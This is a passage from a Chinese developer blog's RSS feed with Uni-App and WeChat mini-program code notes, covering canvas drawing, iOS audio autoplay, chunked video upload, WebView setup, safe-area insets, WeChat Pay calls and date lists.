        uni<span>.</span><span>upx2px</span><span>(</span><span>225</span><span>)</span>
      <span>)</span>
      <span>this</span><span>.</span>preImages<span>.</span><span>push</span><span>(</span><span>{</span>
        <span>src</span><span>:</span> canvas<span>.</span><span>toDataURL</span><span>(</span><span>)</span><span>,</span>
        <span>serial</span><span>:</span> index<span>,</span>
        <span>show</span><span>:</span> <span>true</span><span>,</span>
        <span>top</span><span>:</span> <span>0</span><span>,</span>
        <span>left</span><span>:</span> <span>0</span><span>,</span>
      <span>}</span><span>)</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> ary <span>=</span> <span>[</span><span>]</span>
  <span>Array</span><span>(</span><span>3</span><span>)</span>
    <span>.</span><span>fill</span><span>(</span><span>1</span><span>)</span>
    <span>.</span><span>map</span><span>(</span><span>(</span><span>_<span>,</span> y</span><span>)</span> <span>=></span>
      <span>Array</span><span>(</span><span>3</span><span>)</span>
        <span>.</span><span>fill</span><span>(</span><span>1</span><span>)</span>
        <span>.</span><span>map</span><span>(</span><span>(</span><span>_<span>,</span> x</span><span>)</span> <span>=></span> ary<span>.</span><span>push</span><span>(</span><span>[</span>x<span>,</span> y<span>]</span><span>)</span><span>)</span>
    <span>)</span>
  ary<span>.</span><span>map</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> <span>render</span><span>(</span>item<span>[</span><span>0</span><span>]</span><span>,</span> item<span>[</span><span>1</span><span>]</span><span>,</span> index<span>)</span><span>)</span>
<span>}</span><span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br></div></div><h2 id="_3-ios-微信内置浏览器自动播放音频"> 3. IOS 微信内置浏览器自动播放音频</h2>
<div><pre><code><span>import</span> wx <span>from</span> <span>'weixin-js-sdk'</span>

<span>/**
 * @description: 加载背景音乐
 * @author: ljw
 */</span>
<span>loadAudio</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> audioContext <span>=</span> uni<span>.</span><span>createInnerAudioContext</span><span>(</span><span>)</span>
  <span>const</span> config <span>=</span> <span>{</span>
    <span>autoplay</span><span>:</span> <span>true</span><span>,</span>
    <span>loop</span><span>:</span> <span>true</span><span>,</span>
    <span>src</span><span>:</span> <span>require</span><span>(</span><span>'./static/audio/How it Began.mp3'</span><span>)</span><span>,</span>
  <span>}</span>
  <span>this</span><span>.</span>$store<span>.</span><span>commit</span><span>(</span><span>'SET_AUDIO'</span><span>,</span> Object<span>.</span><span>assign</span><span>(</span>audioContext<span>,</span> config<span>)</span><span>)</span>
  <span>this</span><span>.</span>$store<span>.</span><span>commit</span><span>(</span><span>'SET_AUDIO_PLAY'</span><span>,</span> <span>true</span><span>)</span>
  wx<span>.</span><span>config</span><span>(</span><span>{</span><span>}</span><span>)</span>
  wx<span>.</span><span>ready</span><span>(</span><span>(</span><span>)</span> <span>=></span> audioContext<span>.</span><span>play</span><span>(</span><span>)</span><span>)</span>
<span>}</span><span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><h2 id="_4-文件切片上传"> 4. 文件切片上传</h2>
<ul>
<li>因后端接口需要上个请求返回的字段（不能并发了...），故而使用了组合函数。</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> UploadVideo <span>}</span> <span>from</span> <span>'@/api/profile'</span>
<span>import</span> jsMd5 <span>from</span> <span>'js-md5'</span>
<span>import</span> qs <span>from</span> <span>'qs'</span>

<span>// 文件切片</span>
<span>function</span> <span>section</span><span>(</span><span>file</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    <span>let</span> fileName <span>=</span> file<span>.</span>name<span>.</span><span>split</span><span>(</span><span>'.'</span><span>)</span><span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>-</span><span>1</span><span>)</span><span>.</span><span>join</span><span>(</span><span>'.'</span><span>)</span><span>,</span>
      ext <span>=</span> file<span>.</span>name<span>.</span><span>split</span><span>(</span><span>'.'</span><span>)</span><span>.</span><span>slice</span><span>(</span><span>-</span><span>1</span><span>)</span><span>[</span><span>0</span><span>]</span><span>,</span>
      chunkSize <span>=</span> <span>1024</span> <span>*</span> <span>1024</span> <span>*</span> <span>2</span><span>,</span>
      count <span>=</span> Math<span>.</span><span>ceil</span><span>(</span>file<span>.</span>size <span>/</span> chunkSize<span>)</span><span>,</span>
      n <span>=</span> <span>0</span><span>,</span>
      chunks <span>=</span> <span>[</span><span>]</span>
    <span>const</span> reader <span>=</span> <span>new</span> <span>FileReader</span><span>(</span>file<span>)</span>
    reader<span>.</span><span>readAsArrayBuffer</span><span>(</span>file<span>)</span>
    reader<span>.</span><span>onload</span> <span>=</span> <span>_</span> <span>=></span> <span>{</span>
      <span>const</span> hashName <span>=</span> <span>jsMd5</span><span>(</span>reader<span>.</span>result<span>)</span>
      <span>while</span> <span>(</span>n <span>&lt;</span> count<span>)</span> <span>{</span>
        chunks<span>.</span><span>push</span><span>(</span><span>{</span>
          <span>file</span><span>:</span> file<span>.</span><span>slice</span><span>(</span>n <span>*</span> chunkSize<span>,</span> <span>(</span>n <span>+</span> <span>1</span><span>)</span> <span>*</span> chunkSize<span>)</span><span>,</span>
          <span>name</span><span>:</span> <span><span>`</span><span><span>${</span>hashName<span>}</span></span><span>_</span><span><span>${</span>fileName<span>}</span></span><span>_</span><span><span>${</span>n <span>+</span> <span>1</span><span>}</span></span><span>.</span><span><span>${</span>ext<span>}</span></span><span>`</span></span><span>,</span>
        <span>}</span><span>)</span>
        n<span>++</span>
      <span>}</span>
      <span>resolve</span><span>(</span><span>{</span>
        <span>name</span><span>:</span> <span><span>`</span><span><span>${</span>hashName<span>}</span></span><span>_</span><span><span>${</span>file<span>.</span>name<span>}</span></span><span>`</span></span><span>,</span>
        <span>size</span><span>:</span> file<span>.</span>size<span>,</span>
        count<span>,</span>
        chunks<span>,</span>
      <span>}</span><span>)</span>
    <span>}</span>
    reader<span>.</span><span>onerror</span> <span>=</span> <span>_</span> <span>=></span> <span>reject</span><span>(</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>// 组合函数</span>
<span>const</span> <span>composePromise</span> <span>=</span>
  <span>(</span><span><span>...</span>fns</span><span>)</span> <span>=></span>
  <span>(</span><span><span>...</span>args</span><span>)</span> <span>=></span>
    fns<span>.</span><span>reduceRight</span><span>(</span>
      <span>(</span><span>sequence<span>,</span> fn</span><span>)</span> <span>=></span> sequence<span>.</span><span>then</span><span>(</span><span>result</span> <span>=></span> <span>fn</span><span>(</span>result<span>)</span><span>)</span><span>,</span>
      Promise<span>.</span><span>resolve</span><span>(</span>fns<span>.</span><span>pop</span><span>(</span><span>)</span><span>(</span><span>...</span>args<span>)</span><span>)</span>
    <span>)</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>uploadVideo</span><span>(</span><span>)</span> <span>{</span>
      uni<span>.</span><span>chooseVideo</span><span>(</span><span>{</span>
        <span>count</span><span>:</span> <span>1</span><span>,</span>
        <span>sourceType</span><span>:</span> <span>[</span><span>'camera'</span><span>,</span> <span>'album'</span><span>]</span><span>,</span>
        <span>success</span><span>:</span> <span>async</span> <span>res</span> <span>=></span> <span>{</span>
          <span>this</span><span>.</span>video <span>=</span> <span>''</span>
          <span>this</span><span>.</span>previewVideo <span>=</span> res<span>.</span>tempFilePath
          <span>this</span><span>.</span>videoProgress <span>=</span> <span>0</span>
          <span>this</span><span>.</span>videoRemove <span>=</span> <span>false</span>
          <span>const</span> <span>{</span> name<span>,</span> size<span>,</span> count<span>,</span> chunks <span>}</span> <span>=</span> <span>await</span> <span>section</span><span>(</span>res<span>.</span>tempFile<span>)</span>

          <span>const</span> promises <span>=</span> chunks<span>.</span><span>map</span><span>(</span><span>(</span><span><span>{</span> file <span>}</span><span>,</span> index</span><span>)</span> <span>=></span> <span>{</span>
            <span>const</span> fm <span>=</span> <span>new</span> <span>FormData</span><span>(</span><span>)</span>
            fm<span>.</span><span>set</span><span>(</span><span>'file'</span><span>,</span> file<span>)</span>
            <span>return</span> <span>(</span><span><span>{</span> new_upload_id<span>,</span> upload_key <span>}</span></span><span>)</span> <span>=></span> <span>{</span>
              <span>const</span> queryParams <span>=</span> <span>{</span>
                <span>file_size</span><span>:</span> size<span>,</span>
                <span>total_index</span><span>:</span> count<span>,</span>
                <span>index</span><span>:</span> index <span>+</span> <span>1</span><span>,</span>
                <span>file_name</span><span>:</span> name<span>,</span>
                <span>upload_id</span><span>:</span> new_upload_id<span>,</span>
                upload_key<span>,</span>
              <span>}</span>

              <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>async</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
                <span>const</span> <span>{</span> data <span>}</span> <span>=</span> <span>await</span> <span>UploadVideo</span><span>(</span>
                  qs<span>.</span><span>stringify</span><span>(</span>queryParams<span>)</span><span>,</span>
                  fm
                <span>)</span><span>.</span><span>catch</span><span>(</span><span>_</span> <span>=></span> <span>{</span>
                  <span>this</span><span>.</span>videoRemove <span>=</span> <span>true</span>
                  <span>reject</span><span>(</span><span>)</span>
                <span>}</span><span>)</span>
                <span>this</span><span>.</span>videoProgress <span>=</span> <span>(</span><span>(</span><span>(</span>index <span>+</span> <span>1</span><span>)</span> <span>/</span> count<span>)</span> <span>*</span> <span>100</span><span>)</span> <span>|</span> <span>0</span>
                <span>resolve</span><span>(</span>data<span>.</span>response<span>)</span>
              <span>}</span><span>)</span>
            <span>}</span>
          <span>}</span><span>)</span>

          <span>const</span> <span>{</span> data <span>}</span> <span>=</span> <span>await</span> <span>composePromise</span><span>(</span><span>...</span>promises<span>.</span><span>reverse</span><span>(</span><span>)</span><span>)</span><span>(</span><span>{</span><span>}</span><span>)</span>
          <span>$showToast</span><span>(</span><span>'上传成功'</span><span>)</span>
          <span>this</span><span>.</span>video <span>=</span> data<span>.</span>response<span>.</span>src
          <span>this</span><span>.</span>videoRemove <span>=</span> <span>true</span>
        <span>}</span><span>,</span>
      <span>}</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>备忘录</title>
      <link>https://www.matrixtheone.ga/web/note/Uni-App/Memo/</link>
      <guid>https://www.matrixtheone.ga/web/note/Uni-App/Memo/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">备忘录</source>
      <category>Uni App</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-webview"> 1. WebView</h2>
<ul>
<li>空地址会导致 WebView 错误跳转，使用 v-if 解决。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>web-view</span>
  <span>v-if</span><span><span>=</span><span>"</span>src<span>"</span></span>
  <span>:src</span><span><span>=</span><span>"</span>src<span>"</span></span>
  <span>:webview-styles</span><span><span>=</span><span>"</span>{ color: $mainColor }<span>"</span></span>
<span>></span></span><span><span><span>&lt;/</span>web-view</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>'WebView'</span><span>,</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>src</span><span>:</span> <span>''</span><span>,</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>onLoad</span><span>(</span><span><span>{</span> url <span>}</span></span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>src <span>=</span> url
  <span>}</span><span>,</span>
  <span>onReady</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>setWebView</span><span>(</span><span>)</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>// App配置</span>
    <span>setWebView</span><span>(</span><span>)</span> <span>{</span>
      <span>try</span> <span>{</span>
        <span>const</span> <span>{</span> statusBarHeight <span>}</span> <span>=</span> uni<span>.</span>$u<span>.</span><span>sys</span><span>(</span><span>)</span>
        <span>const</span> currentWebview <span>=</span>
          <span>this</span><span>.</span>$scope<span>.</span><span>$getAppWebview</span><span>(</span><span>)</span> <span>||</span> <span>this</span><span>.</span>$parent<span>.</span>$scope<span>.</span><span>$getAppWebview</span><span>(</span><span>)</span>
        <span>const</span> wv <span>=</span> currentWebview<span>.</span><span>children</span><span>(</span><span>)</span><span>[</span><span>0</span><span>]</span>
        wv<span>.</span><span>setStyle</span><span>(</span><span>{</span>
          <span>top</span><span>:</span> <span>44</span> <span>+</span> statusBarHeight<span>,</span>
          <span>bottom</span><span>:</span> <span>0</span><span>,</span>
          <span>scalable</span><span>:</span> <span>true</span><span>,</span>
        <span>}</span><span>)</span>
      <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span><span>}</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><h2 id="_2-ios-安全域"> 2. IOS 安全域</h2>
<ul>
<li>要在当前使用界面获取，避免出现安全域为负数的情况（一开始存 Vuex 中了）。</li>
</ul>
<div><pre><code><span>onShow</span><span>(</span><span>)</span> <span>{</span>
  uni<span>.</span><span>getSystemInfo</span><span>(</span><span>{</span>
    <span>success</span><span>:</span> <span>(</span><span><span>{</span> safeAreaInsets<span>,</span> screenHeight<span>,</span> safeArea <span>}</span></span><span>)</span> <span>=></span> <span>{</span>
      <span>this</span><span>.</span>bottomSafeArea <span>=</span>
        safeAreaInsets<span>.</span>bottom <span>></span> <span>0</span>
          <span>?</span> safeAreaInsets<span>.</span>bottom
          <span>:</span> screenHeight <span>-</span> safeArea<span>.</span>bottom
    <span>}</span><span>,</span>
  <span>}</span><span>)</span>
<span>}</span><span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_3-tips"> 3. Tips</h2>
<ul>
<li>
<p>可使用 trim 修饰符解决 input 输入框类型为 password 时的样式问题。</p>
</li>
<li>
<p>App 中修改轮播图小点样式使用 <code>/deep/ .uni-swiper-dot</code>、<code>/deep/ .uni-swiper-dot-active</code>。微信小程序中将 uni 改为 wx <code>/deep/ .wx-swiper-dot</code>、<code>/deep/ .wx-swiper-dot-active</code>。</p>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>小程序</title>
      <link>https://www.matrixtheone.ga/web/note/Uni-App/Mini-Program/</link>
      <guid>https://www.matrixtheone.ga/web/note/Uni-App/Mini-Program/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">小程序</source>
      <category>小程序</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-解决-onreachbottom-350ms-频繁触发"> 1. 解决 onReachBottom 350ms 频繁触发</h2>
<div><pre><code><span>onReachBottom</span><span>(</span><span>)</span> <span>{</span>
  <span>setTimeout</span><span>(</span><span>this</span><span>.</span>loadSaleInfo<span>,</span> <span>400</span><span>)</span>
<span>}</span><span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_2-微信支付"> 2. 微信支付</h2>
<div><pre><code><span>/**
 * @description: 微信支付
 * @param {Number} orderId 订单ID
 * @param {String} orderNo 订单号
 * @param {Number} grouponOrderId 拼团订单ID
 * @param {Number} type 订单号
 * @author: ljw
 */</span>
<span>async</span> <span>wxPay</span><span>(</span><span><span>{</span> orderId<span>,</span> orderNo<span>,</span> grouponOrderId <span>}</span><span>,</span> type</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> $showToast <span>}</span> <span>=</span> <span>this</span>
  <span>// 创建支付订单</span>
  <span>const</span> <span>{</span> code<span>,</span> data <span>}</span> <span>=</span> <span>await</span> <span>Pay</span><span>(</span><span>{</span> orderId <span>}</span><span>)</span>
  <span>if</span> <span>(</span>code <span>===</span> <span>200</span><span>)</span> <span>{</span>
    <span>const</span> <span>{</span> timeStamp<span>,</span> nonceStr<span>,</span> paySign<span>,</span> signType <span>}</span> <span>=</span> data
    <span>// 唤醒微信支付</span>
    uni<span>.</span><span>requestPayment</span><span>(</span><span>{</span>
      <span>provider</span><span>:</span> <span>'wxpay'</span><span>,</span>
      <span>orderInfo</span><span>:</span> orderNo<span>,</span>
      timeStamp<span>,</span>
      nonceStr<span>,</span>
      <span>package</span><span>:</span> data<span>.</span>package<span>,</span>
      signType<span>,</span>
      paySign<span>,</span>
      <span>success</span><span>:</span> <span>_</span> <span>=></span> <span>{</span>
        <span>switch</span> <span>(</span>type<span>)</span> <span>{</span>
          <span>case</span> <span>1</span><span>:</span>
            <span>this</span><span>.</span>shareButton <span>=</span> <span>false</span>
            <span>this</span><span>.</span>hint <span>=</span> <span>'购买成功'</span>
            <span>break</span>
          <span>case</span> <span>2</span><span>:</span>
            <span>this</span><span>.</span>grouponOrderId <span>=</span> grouponOrderId
            <span>this</span><span>.</span>shareButton <span>=</span> <span>true</span>
            <span>this</span><span>.</span>hint <span>=</span> <span>'开团成功'</span>
            <span>break</span>
          <span>case</span> <span>3</span><span>:</span>
            <span>this</span><span>.</span>shareButton <span>=</span> <span>false</span>
            <span>this</span><span>.</span>hint <span>=</span> <span>'加入成功'</span>
            <span>break</span>
        <span>}</span>
        <span>this</span><span>.</span>isLoginTips <span>=</span> <span>false</span>
        <span>this</span><span>.</span>modalVisible <span>=</span> <span>true</span>
      <span>}</span><span>,</span>
      <span>fail</span><span>:</span> <span>_</span> <span>=></span> <span>$showToast</span><span>(</span><span>'支付失败'</span><span>)</span><span>,</span>
    <span>}</span><span>)</span>
  <span>}</span>
<span>}</span><span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br></div></div><h2 id="_3-canvas-绘制圆角"> 3. canvas 绘制圆角</h2>
<div><pre><code><span>/**
 * @description: 绘制圆角
 * @param {Number} x x坐标
 * @param {Number} y y坐标
 * @param {Number} w 宽度
 * @param {Number} h 高度
 * @param {Number} r 圆角
 * @param {CanvasContext} ctx 绘制上下文
 * @author: ljw
 */</span>
<span>darwRoundRect</span><span>(</span><span>x<span>,</span> y<span>,</span> w<span>,</span> h<span>,</span> r<span>,</span> ctx</span><span>)</span> <span>{</span>
  ctx<span>.</span><span>save</span><span>(</span><span>)</span>
  ctx<span>.</span><span>beginPath</span><span>(</span><span>)</span>

  <span>// 左上弧线</span>
  ctx<span>.</span><span>arc</span><span>(</span>x <span>+</span> r<span>,</span> y <span>+</span> r<span>,</span> r<span>,</span> <span>1</span> <span>*</span> Math<span>.</span><span>PI</span><span>,</span> <span>1.5</span> <span>*</span> Math<span>.</span><span>PI</span><span>)</span>
  <span>// 左直线</span>
  ctx<span>.</span><span>moveTo</span><span>(</span>x<span>,</span> y <span>+</span> r<span>)</span>
  ctx<span>.</span><span>lineTo</span><span>(</span>x<span>,</span> y <span>+</span> h <span>-</span> r<span>)</span>
  <span>// 左下弧线</span>
  ctx<span>.</span><span>arc</span><span>(</span>x <span>+</span> r<span>,</span> y <span>+</span> h <span>-</span> r<span>,</span> r<span>,</span> <span>0.5</span> <span>*</span> Math<span>.</span><span>PI</span><span>,</span> <span>1</span> <span>*</span> Math<span>.</span><span>PI</span><span>)</span>
  <span>// 下直线</span>
  ctx<span>.</span><span>lineTo</span><span>(</span>x <span>+</span> r<span>,</span> y <span>+</span> h<span>)</span>
  ctx<span>.</span><span>lineTo</span><span>(</span>x <span>+</span> w <span>-</span> r<span>,</span> y <span>+</span> h<span>)</span>
  <span>// 右下弧线</span>
  ctx<span>.</span><span>arc</span><span>(</span>x <span>+</span> w <span>-</span> r<span>,</span> y <span>+</span> h <span>-</span> r<span>,</span> r<span>,</span> <span>0</span> <span>*</span> Math<span>.</span><span>PI</span><span>,</span> <span>0.5</span> <span>*</span> Math<span>.</span><span>PI</span><span>)</span>
  <span>// 右直线</span>
  ctx<span>.</span><span>lineTo</span><span>(</span>x <span>+</span> w<span>,</span> y <span>+</span> h <span>-</span> r<span>)</span>
  ctx<span>.</span><span>lineTo</span><span>(</span>x <span>+</span> w<span>,</span> y <span>+</span> r<span>)</span>
  <span>// 右上弧线</span>
  ctx<span>.</span><span>arc</span><span>(</span>x <span>+</span> w <span>-</span> r<span>,</span> y <span>+</span> r<span>,</span> r<span>,</span> <span>1.5</span> <span>*</span> Math<span>.</span><span>PI</span><span>,</span> <span>2</span> <span>*</span> Math<span>.</span><span>PI</span><span>)</span>
  <span>// 上直线</span>
  ctx<span>.</span><span>lineTo</span><span>(</span>x <span>+</span> w <span>-</span> r<span>,</span> y<span>)</span>
  ctx<span>.</span><span>lineTo</span><span>(</span>x <span>+</span> r<span>,</span> y<span>)</span>

  ctx<span>.</span><span>setFillStyle</span><span>(</span><span>'white'</span><span>)</span>
  ctx<span>.</span><span>fill</span><span>(</span><span>)</span>
<span>}</span><span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br></div></div><h2 id="_4-获取日期信息与梯度时间"> 4. 获取日期信息与梯度时间</h2>
<div><pre><code><span>/**
 * @description: 门票日期列表
 * @author: ljw
 */</span>
<span>export</span> <span>const</span> <span>playDateList</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> date <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span>
  <span>const</span> length <span>=</span> <span>7</span>
  <span>const</span> ary <span>=</span> <span>[</span><span>]</span>
  <span>const</span> size <span>=</span> <span>24</span> <span>*</span> <span>60</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span>
  <span>while</span> <span>(</span>ary<span>.</span>length <span>&lt;</span> length<span>)</span> <span>{</span>
    ary<span>.</span><span>push</span><span>(</span><span>{</span>
      <span>year</span><span>:</span> date<span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>,</span>
      <span>date</span><span>:</span> <span><span>`</span><span><span>${</span><span>(</span>date<span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>+</span> <span>1</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>-</span><span><span>${</span>date
        <span>.</span><span>getDate</span><span>(</span><span>)</span>
        <span>.</span><span>toString</span><span>(</span><span>)</span>
        <span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>`</span></span><span>,</span>
      <span>week</span><span>:</span> <span><span>`</span><span>周</span><span><span>${</span><span>[</span><span>'日'</span><span>,</span> <span>'一'</span><span>,</span> <span>'二'</span><span>,</span> <span>'三'</span><span>,</span> <span>'四'</span><span>,</span> <span>'五'</span><span>,</span> <span>'六'</span><span>]</span><span>[</span>date<span>.</span><span>getDay</span><span>(</span><span>)</span><span>]</span><span>}</span></span><span>`</span></span><span>,</span>
    <span>}</span><span>)</span>
    date<span>.</span><span>setTime</span><span>(</span>date<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>+</span> size<span>)</span>
  <span>}</span>

  <span>return</span> ary
<span>}</span>

<span>/**
 * @description: 门票时间列表
 * @author: ljw
 */</span>
<span>export</span> <span>const</span> <span>playTimeList</span> <span>=</span> <span>date</span> <span>=></span> <span>{</span>
  <span>const</span> selectDate <span>=</span> <span><span>`</span><span><span>${</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>}</span></span><span>/</span><span><span>${</span>date<span>}</span></span><span>`</span></span>
  <span>const</span> startTime <span>=</span> <span>new</span> <span>Date</span><span>(</span><span><span>`</span><span><span>${</span>selectDate<span>}</span></span><span> 09:00:00</span><span>`</span></span><span>)</span>
  <span>const</span> length <span>=</span> <span>27</span>
  <span>const</span> size <span>=</span> <span>30</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span>
  <span>const</span> ary <span>=</span> <span>[</span><span>]</span>
  <span>while</span> <span>(</span>ary<span>.</span>length <span>&lt;</span> length<span>)</span> <span>{</span>
    ary<span>.</span><span>push</span><span>(</span>
      <span><span>`</span><span><span>${</span>startTime<span>.</span><span>getHours</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>:</span><span><span>${</span>startTime
        <span>.</span><span>getMinutes</span><span>(</span><span>)</span>
        <span>.</span><span>toString</span><span>(</span><span>)</span>
        <span>.</span><span>padStart</span><span>(</span><span>2</span><span>,</span> <span>0</span><span>)</span><span>}</span></span><span>`</span></span>
    <span>)</span>
    startTime<span>.</span><span>setTime</span><span>(</span>startTime<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>+</span> size<span>)</span>
  <span>}</span>

  <span>return</span> ary
    <span>.</span><span>filter</span><span>(</span><span>time</span> <span>=></span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span><span>`</span><span><span>${</span>selectDate<span>}</span></span><span> </span><span><span>${</span>time<span>}</span></span><span>:00</span><span>`</span></span><span>)</span> <span>></span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span>
    <span>.</span><span>map</span><span>(</span><span>(</span><span>time<span>,</span> index</span><span>)</span> <span>=></span> <span>(</span><span>{</span>
      <span>label</span><span>:</span> time<span>,</span>
      <span>value</span><span>:</span> index <span>+</span> <span>1</span><span>,</span>
    <span>}</span><span>)</span><span>)</span>
<span>}</span>
</code></pre>
